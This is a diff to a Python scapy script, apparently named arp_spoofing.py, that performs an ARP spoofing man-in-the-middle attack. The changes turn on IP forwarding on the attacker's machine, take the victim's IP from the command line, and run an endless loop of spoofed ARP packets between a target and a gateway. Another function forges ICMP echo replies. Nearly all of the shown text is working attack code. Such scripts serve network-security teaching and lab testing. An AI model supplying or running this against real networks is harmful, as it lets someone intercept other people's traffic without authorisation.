@@ -2,8 +2,13 @@
 
 import scapy.all as scapy 
 import time
+import sys
+import os
 from scapy.layers.l2 import ARP                         # create and manipulate ARP packets
 from scapy.layers.inet import Ether, IP, ICMP           # create and manipulate ... packets
+
+def _enable_linux_iproute():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Enable IP forwarding on the attacker's machine
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)                    # creates an ARP request packet
@@ -33,11 +38,16 @@ def ping_reply(packet):
         reply = Ether(src=dst_mac, dst=src_mac) / IP(src=dst_ip, dst=src_ip) / ICMP(type=0)
         scapy.send(reply, verbose=False)                # Send the reply
 
-target_ip = "192.168.0.196" 
+
+if len(sys.argv) < 2:
+    print("Usage: ./arp_spoofing.py [target_ip]")
+    sys.exit()   
+target_ip = sys.argv[1]
 gateway_ip = "192.168.0.50" 
 
 """Start the spoofing attack""" 
 try:
+    _enable_linux_iproute()
     sent_packets_count = 0                              # init a counter for the number of packets sent
     while True:                                         # keep sending ARP spoofing packets until interrupted
         spoof(target_ip, gateway_ip)                    # send an ARP spoofing packet to the victim device
